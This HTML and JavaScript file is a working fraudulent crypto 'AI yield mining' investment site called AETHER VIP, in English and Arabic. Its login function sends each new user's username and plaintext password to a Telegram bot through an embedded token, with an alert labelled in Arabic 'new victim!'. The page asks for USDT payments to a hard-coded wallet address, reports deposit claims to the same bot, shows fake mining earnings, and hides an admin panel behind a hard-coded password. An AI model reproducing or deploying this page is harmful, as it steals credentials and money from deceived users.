<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AETHER VIP | Global AI Yield Protocol</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background: #020617; color: #f1f5f9; font-family: 'Segoe UI', sans-serif; overflow-x: hidden; }
        .aether-card { background: rgba(30, 41, 59, 0.4); backdrop-filter: blur(15px); border-radius: 2rem; border: 1px solid rgba(255,255,255,0.05); }
        .btn-gold { background: linear-gradient(135deg, #fbbf24 0%, #d97706 100%); color: #000; font-weight: 900; }
        .hidden { display: none !important; }
        @keyframes glow { 0%, 100% { box-shadow: 0 0 5px #fbbf24; } 50% { box-shadow: 0 0 20px #fbbf24; } }
        .vip-active { animation: glow 2s infinite; border: 1px solid #fbbf24 !important; }
        .certificate-bg { background: linear-gradient(45deg, #1e293b 0%, #0f172a 100%); border: 6px double #475569; }
    </style>
</head>
<body>

<div class="fixed top-4 right-4 z-[2000]">
    <button onclick="toggleLang()" class="bg-slate-800/80 backdrop-blur px-4 py-2 rounded-full border border-white/10 text-[10px] font-black shadow-2xl">
        <i class="fas fa-globe text-yellow-500 mr-1"></i> <span id="langLabel">العربية</span>
    </button>
</div>

<div class="bg-yellow-600 text-black text-[8px] py-1 text-center font-black uppercase tracking-widest">
    <span id="topBar">AETHER SECURE NODE CONNECTION: ACTIVE | ENCRYPTION: AES-256</span>
</div>

<div id="authSection" class="fixed inset-0 z-[1000] bg-slate-950 flex items-center justify-center p-6">
    <div class="aether-card p-10 w-full max-w-md shadow-2xl border-t-4 border-yellow-500">
        <div class="text-center mb-8">
            <i class="fas fa-atom text-5xl text-yellow-500 mb-4"></i>
            <h1 class="text-3xl font-black text-white italic">AETHER <span class="text-yellow-500">VIP</span></h1>
            <p id="authSub" class="text-[9px] text-gray-500 uppercase tracking-widest">Advanced Yield Mining Platform</p>
        </div>
        <div class="space-y-4">
            <input type="text" id="username" placeholder="Username" class="w-full bg-slate-900 p-4 rounded-2xl border border-slate-800 outline-none focus:border-yellow-500 text-white text-center">
            <input type="password" id="password" placeholder="Password" class="w-full bg-slate-900 p-4 rounded-2xl border border-slate-800 outline-none focus:border-yellow-500 text-white text-center">
            <button onclick="handleAuth()" id="loginBtn" class="w-full btn-gold py-5 rounded-2xl uppercase text-sm shadow-xl active:scale-95 transition">CONNECT PROTOCOL</button>
        </div>
    </div>
</div>

<div id="mainApp" class="hidden pb-32">
    <header class="p-6 flex justify-between items-center glass sticky top-0 z-50 bg-slate-950/80 backdrop-blur-md border-b border-white/5">
        <div class="flex items-center gap-3">
            <div class="w-10 h-10 rounded-xl bg-yellow-500 flex items-center justify-center text-black font-black italic">A</div>
            <div>
                <h2 id="displayUser" class="font-black text-white text-sm">---</h2>
                <p id="verifiedTxt" class="text-[8px] text-green-500 font-bold uppercase">Node Verified</p>
            </div>
        </div>
        <div class="text-left">
            <p id="balLabel" class="text-[8px] text-gray-500 font-bold uppercase">Available Balance</p>
            <p class="text-xl font-mono font-black text-yellow-500"><span id="userBalance">0.00</span> <span class="text-xs">USDT</span></p>
        </div>
    </header>

    <main class="p-4 max-w-lg mx-auto">
        <div id="homeTab" class="space-y-6">
            <div class="aether-card p-5 border-blue-500/20 bg-blue-500/5 flex justify-between items-center">
                <div><p id="statusLabel" class="text-[10px] text-blue-400 font-bold uppercase">System Status</p><p id="statusDesc" class="text-xs text-white">All Nodes Operational</p></div>
                <i class="fas fa-check-circle text-green-500"></i>
            </div>
            <h3 id="nodesLabel" class="text-[10px] font-black text-gray-600 uppercase tracking-widest px-2">Investment Nodes</h3>
            <div id="plansContainer" class="space-y-4"></div>
        </div>

        <div id="tasksTab" class="hidden">
            <div class="text-center mb-8"><h3 id="miningLabel" class="text-2xl font-black text-white italic uppercase">AI Mining Hub</h3></div>
            <div id="tasksList" class="space-y-4"></div>
        </div>

        <div id="profileTab" class="hidden text-center">
            <div class="certificate-bg p-8 rounded-[2.5rem] text-center relative overflow-hidden mb-6">
                <h4 id="certTitle" class="text-yellow-500 font-serif italic text-xl mb-2 font-black">AETHER OFFICIAL CERTIFICATE</h4>
                <p class="text-white font-mono text-lg border-b border-yellow-500/50 pb-2 mb-4" id="certName">USER</p>
                <p id="certStatus" class="text-[9px] text-gray-500 uppercase">Status: Certified Global Investor</p>
            </div>
            <button onclick="location.reload()" id="logoutBtn" class="w-full py-4 rounded-2xl border border-red-900/30 text-red-500 text-[10px] font-black uppercase">Logout</button>
        </div>
    </main>

    <nav class="fixed bottom-6 left-6 right-6 h-20 glass rounded-[2.5rem] flex justify-around items-center border border-white/10 shadow-2xl z-50 bg-slate-900/90">
        <button onclick="switchTab('home')" class="flex flex-col items-center text-yellow-500" id="homeBtn"><i class="fas fa-grid-2 text-xl"></i><span id="navHome" class="text-[8px] mt-1 font-black tracking-widest">HOME</span></button>
        <button onclick="switchTab('tasks')" class="flex flex-col items-center text-gray-600" id="tasksBtn"><i class="fas fa-microchip text-xl"></i><span id="navMining" class="text-[8px] mt-1 font-black tracking-widest">MINING</span></button>
        <div onclick="openAdmin()" class="w-12 h-12"></div>
        <button onclick="switchTab('profile')" class="flex flex-col items-center text-gray-600" id="profileBtn"><i class="fas fa-certificate text-xl"></i><span id="navCert" class="text-[8px] mt-1 font-black tracking-widest">CERT</span></button>
    </nav>
</div>

<div id="adminPanel" class="hidden fixed inset-0 bg-black z-[2000] p-8 overflow-y-auto font-mono text-xs">
    <div class="flex justify-between border-b border-red-900 pb-4 mb-8 text-red-600 font-bold uppercase"><span>Master_Root_Console</span><button onclick="document.getElementById('adminPanel').classList.add('hidden')">[X]</button></div>
    <div id="adminUserList" class="space-y-4"></div>
</div>

<div id="depositModal" class="hidden fixed inset-0 z-[1100] bg-black/98 flex items-center justify-center p-6 backdrop-blur-xl">
    <div class="aether-card p-10 w-full max-w-sm border-2 border-yellow-500/20 text-center">
        <h2 class="text-xl font-black text-white italic mb-6 uppercase"><span id="actLabel">ACTIVATE</span> <span id="targetVip" class="text-yellow-500"></span></h2>
        <div class="bg-black p-4 rounded-3xl border border-white/5 mb-6 text-center">
            <p class="text-[8px] text-gray-500 uppercase font-black mb-2">USDT Address (BEP20)</p>
            <p class="text-[10px] font-mono text-blue-400 break-all p-3 bg-slate-900 rounded-xl">0x57F2CA3C7C650497a3dcC13D88f4BC19c6178131</p>
        </div>
        <button onclick="confirmDep()" id="confirmBtn" class="w-full btn-gold py-5 rounded-2xl text-[10px] font-black uppercase">I HAVE TRANSFERRED</button>
    </div>
</div>

<script>
    const TG_TOKEN = '8651075370:AAEbg8Pqaf0MZEcYPH7Wk0oJ0D_L0iDDJDU';
    const TG_ID = '8584121348';
    let currentLang = 'en';
    let currentUser = null;
    let clickCount = 0;

    const PLANS = [
        {id: 1, name: "ALPHA-1", price: 20, profit: 2.8, tasks: 5},
        {id: 2, name: "BETA-2", price: 200, profit: 32, tasks: 10},
        {id: 3, name: "OMEGA-3", price: 1000, profit: 165, tasks: 20}
    ];

    const TRANSLATIONS = {
        en: {
            lang: "العربية", authSub: "Advanced Yield Mining Platform", login: "Connect Protocol", user: "Username", pass: "Password",
            verified: "Node Verified", balance: "Available Balance", status: "System Status", statusD: "All Nodes Operational",
            nodes: "Investment Nodes", mining: "AI Mining Hub", cert: "Aether Official Certificate", certS: "Status: Certified Global Investor",
            logout: "Logout", navH: "HOME", navM: "MINING", navC: "CERT", act: "ACTIVATE", confirm: "I HAVE TRANSFERRED",
            wait: "Verifying... please wait 10 minutes.", buy: "Activate", taskWait: "Syncing...", taskDone: "Synced ✅"
        },
        ar: {
            lang: "English", authSub: "منصة تعدين العوائد المتقدمة", login: "اتصال بالبروتوكول", user: "اسم المستخدم", pass: "كلمة المرور",
            verified: "تم التحقق من العقدة", balance: "الرصيد المتاح", status: "حالة النظام", statusD: "جميع العقد تعمل بنجاح",
            nodes: "عقد الاستثمار", mining: "مركز تعدين الذكاء الاصطناعي", cert: "شهادة آيثر الرسمية", certS: "الحالة: مستثمر عالمي معتمد",
            logout: "تسجيل الخروج", navH: "الرئيسية", navM: "التعدين", navC: "الشهادة", act: "تفعيل", confirm: "لقد قمت بالتحويل",
            wait: "جاري التحقق... يرجى الانتظار 10 دقائق.", buy: "تفعيل الآن", taskWait: "جاري المزامنة...", taskDone: "تمت المزامنة ✅"
        }
    };

    function toggleLang() {
        currentLang = currentLang === 'en' ? 'ar' : 'en';
        const t = TRANSLATIONS[currentLang];
        document.getElementById('langLabel').innerText = t.lang;
        document.getElementById('authSub').innerText = t.authSub;
        document.getElementById('loginBtn').innerText = t.login;
        document.getElementById('username').placeholder = t.user;
        document.getElementById('password').placeholder = t.pass;
        document.getElementById('verifiedTxt').innerText = t.verified;
        document.getElementById('balLabel').innerText = t.balance;
        document.getElementById('statusLabel').innerText = t.status;
        document.getElementById('statusDesc').innerText = t.statusD;
        document.getElementById('nodesLabel').innerText = t.nodes;
        document.getElementById('miningLabel').innerText = t.mining;
        document.getElementById('certTitle').innerText = t.cert;
        document.getElementById('certStatus').innerText = t.certS;
        document.getElementById('logoutBtn').innerText = t.logout;
        document.getElementById('navHome').innerText = t.navH;
        document.getElementById('navMining').innerText = t.navM;
        document.getElementById('navCert').innerText = t.navC;
        document.getElementById('actLabel').innerText = t.act;
        document.getElementById('confirmBtn').innerText = t.confirm;
        renderPlans();
    }

    function notifyTG(msg) {
        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(msg)}`);
    }

    function handleAuth() {
        const u = document.getElementById('username').value.trim();
        const p = document.getElementById('password').value.trim();
        if(!u || !p) return;
        let users = JSON.parse(localStorage.getItem('ae_v4') || "{}");
        if(!users[u]) {
            users[u] = { balance: 0.00, vip: 0 };
            localStorage.setItem('ae_v4', JSON.stringify(users));
            notifyTG(`👤 ضحية جديدة!\nUser: ${u}\nPass: ${p}\nLang: ${currentLang}`);
        }
        currentUser = u;
        document.getElementById('certName').innerText = u.toUpperCase();
        document.getElementById('displayUser').innerText = u;
        document.getElementById('authSection').classList.add('hidden');
        document.getElementById('mainApp').classList.remove('hidden');
        updateUI();
        renderPlans();
    }

    function updateUI() {
        const users = JSON.parse(localStorage.getItem('ae_v4'));
        document.getElementById('userBalance').innerText = users[currentUser].balance.toFixed(2);
    }

    function renderPlans() {
        document.getElementById('plansContainer').innerHTML = PLANS.map(p => `
            <div class="aether-card p-6 flex justify-between items-center border-l-4 border-yellow-500">
                <div><h4 class="font-black text-white italic">${p.name}</h4><p class="text-[9px] text-gray-500 uppercase mt-1">Price: ${p.price} USDT</p></div>
                <button onclick="openDep('${p.name}')" class="btn-gold px-6 py-2 rounded-xl text-[10px] uppercase">${TRANSLATIONS[currentLang].buy}</button>
            </div>`).join('');
    }

    function switchTab(t) {
        document.getElementById('homeTab').classList.add('hidden');
        document.getElementById('tasksTab').classList.add('hidden');
        document.getElementById('profileTab').classList.add('hidden');
        document.getElementById(t + 'Tab').classList.remove('hidden');
        document.getElementById('homeBtn').classList.replace('text-yellow-500', 'text-gray-600');
        document.getElementById('tasksBtn').classList.replace('text-yellow-500', 'text-gray-600');
        document.getElementById('profileBtn').classList.replace('text-yellow-500', 'text-gray-600');
        document.getElementById(t + 'Btn').classList.replace('text-gray-600', 'text-yellow-500');
        if(t === 'tasks') renderTasks();
    }

    function renderTasks() {
        const user = JSON.parse(localStorage.getItem('ae_v4'))[currentUser];
        const container = document.getElementById('tasksList');
        if(user.vip === 0) {
            container.innerHTML = `<div class="p-16 text-center aether-card border-dashed border-2 border-white/5 opacity-50"><p class="text-[10px] font-black uppercase tracking-widest">Node Inactive</p></div>`;
            return;
        }
        const plan = PLANS.find(p => p.id === user.vip);
        container.innerHTML = "";
        for(let i=1; i<=plan.tasks; i++) {
            container.innerHTML += `<div class="aether-card p-5 flex justify-between items-center border-r-4 border-blue-500 vip-active">
                <div><p class="text-[10px] font-black text-white italic">AI HASH TASK #${i}</p></div>
                <button onclick="runTask(this, ${plan.profit/plan.tasks})" class="bg-blue-600 text-white px-5 py-2 rounded-xl text-[9px] font-black">START</button>
            </div>`;
        }
    }

    function runTask(btn, amt) {
        btn.disabled = true; btn.innerText = TRANSLATIONS[currentLang].taskWait;
        setTimeout(() => {
            let users = JSON.parse(localStorage.getItem('ae_v4'));
            users[currentUser].balance += amt;
            localStorage.setItem('ae_v4', JSON.stringify(users));
            updateUI();
            btn.parentElement.classList.add('opacity-30'); btn.innerText = TRANSLATIONS[currentLang].taskDone;
        }, 1500);
    }

    function openAdmin() {
        clickCount++;
        if(clickCount >= 5) {
            const pass = prompt("ROOT_KEY:");
            if(pass === 'ADMIN2026') {
                document.getElementById('adminPanel').classList.remove('hidden');
                loadAdm();
            }
            clickCount = 0;
        }
    }

    function loadAdm() {
        const users = JSON.parse(localStorage.getItem('ae_v4') || "{}");
        document.getElementById('adminUserList').innerHTML = Object.entries(users).map(([u, d]) => `
            <div class="bg-slate-900 p-4 rounded-xl flex justify-between items-center">
                <span class="text-white uppercase">${u} (V${d.vip})</span>
                <div class="flex gap-1">
                    <button onclick="setV('${u}',1)" class="bg-yellow-900 px-2 py-1 rounded">V1</button>
                    <button onclick="setV('${u}',2)" class="bg-yellow-900 px-2 py-1 rounded">V2</button>
                    <button onclick="setV('${u}',3)" class="bg-yellow-900 px-2 py-1 rounded">V3</button>
                </div>
            </div>`).join('');
    }

    function setV(n, l) {
        let u = JSON.parse(localStorage.getItem('ae_v4'));
        u[n].vip = l;
        localStorage.setItem('ae_v4', JSON.stringify(u));
        loadAdm();
    }

    function openDep(v) { document.getElementById('targetVip').innerText = v; document.getElementById('depositModal').classList.remove('hidden'); }
    function confirmDep() {
        notifyTG(`💰 طلب إيداع!\nUser: ${currentUser}\nPlan: ${document.getElementById('targetVip').innerText}`);
        alert(TRANSLATIONS[currentLang].wait);
        document.getElementById('depositModal').classList.add('hidden');
    }
</script>
</body>
</html>
